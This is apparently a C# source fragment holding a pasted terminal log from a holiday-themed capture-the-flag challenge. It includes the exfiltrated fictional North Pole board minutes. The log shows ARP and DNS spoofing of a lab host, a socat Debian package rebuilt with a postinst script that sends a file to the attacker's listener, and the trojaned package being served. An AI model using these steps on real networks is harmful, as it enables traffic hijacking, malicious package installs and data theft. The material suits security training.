            //guest@9cc3fc9e316e:~$ 

            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s suriv_amd64.deb
            //dpkg-deb: building package 'socat' in 'suriv_amd64.deb'.





            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=35729
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py 
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=48548 UDP.dport=domain
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=48548
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ./d.py 
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=3624 UDP.dport=domain
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=3624
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=64350 UDP.dport=domain
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=64350
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ^C
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=35024 UDP.dport=domain
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=35024
            //                                                                                                                                            │guest@9cc3fc9e316e:~$ ./d.py
            //────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

            // socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat && cat hello.txt

            // 
            //Ginger Breaddie
            //King Moonracer
            //Mrs. Donner
            //Charlie In the Box
            //Krampus
            //Dolly
            //Snow Miser
            //Alabaster Snowball
            //Queen of the Winter Spirits
            //Opposed: 
            //                Jack Frost
            //Resolution carries.  Construction approved.
            //NEW BUSINESS:
            //Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000
            // BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposa
            //l, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.
            //Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.guest@9cc3fc9e316e:~/debs$ 
            //──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            //HELP.md  a.py  d.py  debs  motd  pcaps  scripts  w.py
            //guest@9cc3fc9e316e:~$ cd debs/
            //guest@9cc3fc9e316e:~/debs$ ls
            //1  3  gedit-common_3.36.1-1_all.deb                      nano_4.8-1ubuntu1_amd64.deb                    nmap_7.80+dfsg1-2build1_amd64.deb  s                          suriv_amd64.deb
            //2  4  golang-github-huandu-xstrings-dev_1.2.1-1_all.deb  netcat-traditional_1.10-41.1ubuntu1_amd64.deb  out.txt                            socat_1.7.3.3-2_amd64.deb  unzip_6.0-25ubuntu1_amd64.deb
            //guest@9cc3fc9e316e:~/debs$ rm suriv_amd64.deb
            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s
            //s/                         socat_1.7.3.3-2_amd64.deb  
            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s
            //s/                         socat_1.7.3.3-2_amd64.deb  
            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s suriv_amd64.deb
            //dpkg-deb: building package 'socat' in 'suriv_amd64.deb'.
            //guest@9cc3fc9e316e:~/debs$ ./w
            //-bash: ./w: No such file or directory
            //guest@9cc3fc9e316e:~/debs$ cd..
            //-bash: cd..: command not found
            //guest@9cc3fc9e316e:~/debs$ cd ..
            //guest@9cc3fc9e316e:~$ ./w
            //-bash: ./w: No such file or directory
            //guest@9cc3fc9e316e:~$ ./w.py 
            //10.6.6.35 - - [31/Dec/2020 17:08:27] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -


            @"

                Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
                Help the North Pole by getting command line access back to this host.
                Read the HELP.md file for information to help you in this endeavor.
                Note: The terminal lifetime expires after 30 or more minutes so be 
                sure to copy off any essential work you have done as you go.

                guest@fa903c5a8046:~$ nano a.py
                guest@fa903c5a8046:~$ nano d.py
                guest@fa903c5a8046:~$ nano w.py
                guest@fa903c5a8046:~$ chmod +x a.py d.py w.py 
                guest@fa903c5a8046:~$ mkdir debs/s
                guest@fa903c5a8046:~$ dpkg-deb -R debs/socat_1.7.3.3-2_amd64.deb debs/s
                guest@fa903c5a8046:~$ ifconfig
                guest@fa903c5a8046:~$ nano debs/s/DEBIAN/postinst
                guest@fa903c5a8046:~$ cat debs/s/DEBIAN/postinst
                
                #!/bin/sh
                socat -u FILE:/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt TCP:10.6.0.2:10001
                
                guest@fa903c5a8046:~$ chmod +x debs/s/DEBIAN/postinst
                guest@fa903c5a8046:~$ dpkg-deb -b debs/s debs/suriv_amd64.deb
                dpkg-deb: building package 'socat' in 'debs/suriv_amd64.deb'.

                guest@fa903c5a8046:~$ ./a.py &
                guest@fa903c5a8046:~$ ./w.py &
                guest@fa903c5a8046:~$ socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat &
                [1] 179
                guest@fa903c5a8046:~$ ./d.py

                <- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:02 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=19105 UDP.dport=domain
                => Ether.src=02:42:0a:06:00:02 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=19105
                [1]+  Done                    socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat

    


                NORTH POLE
                LAND USE BOARD
                MEETING MINUTES
                January 20, 2020
                Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole
                Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.
                Roll call of Board members please:
                Chairman Jack Frost - Present
                Vice Chairman Mother Nature - Present
                Superman - Present
                Clarice - Present
                Yukon Cornelius - HERE!
                Ginger Breaddie - Present
                King Moonracer - Present
                Mrs. Donner - Present
                Tanta Kringle - Present
                Charlie In-the-Box - Here
                Krampus - Growl
                Dolly - Present
                Snow Miser - Heya!
                Alabaster Snowball - Hello
                Queen of the Winter Spirits - Present
                ALSO PRESENT:
                                Kris Kringle
                                Pepper Minstix
                                Heat Miser
                                Father Time
                Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- f
                or people who are interested in this meeting.
                Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.
                OLD BUSINESS: No Old Business.
                RESOLUTIONS:
                The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering report
                s. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local 
                residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. 
                In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given
                 her adoption of Kris Kringle as a son early in his life.  
                Approved:
                Mother Nature
                Superman
                Clarice
                Yukon Cornelius
                Ginger Breaddie
                King Moonracer
                Mrs. Donner
                Charlie In the Box
                Krampus
                Dolly
                Snow Miser
                Alabaster Snowball
                Queen of the Winter Spirits
                Opposed: 
                                Jack Frost
                Resolution carries.  Construction approved.
                NEW BUSINESS:
                Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000
                 BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposa
                l, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.
                Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.

                
            ".Blog(_logger, "Solution");

        }
    }
}

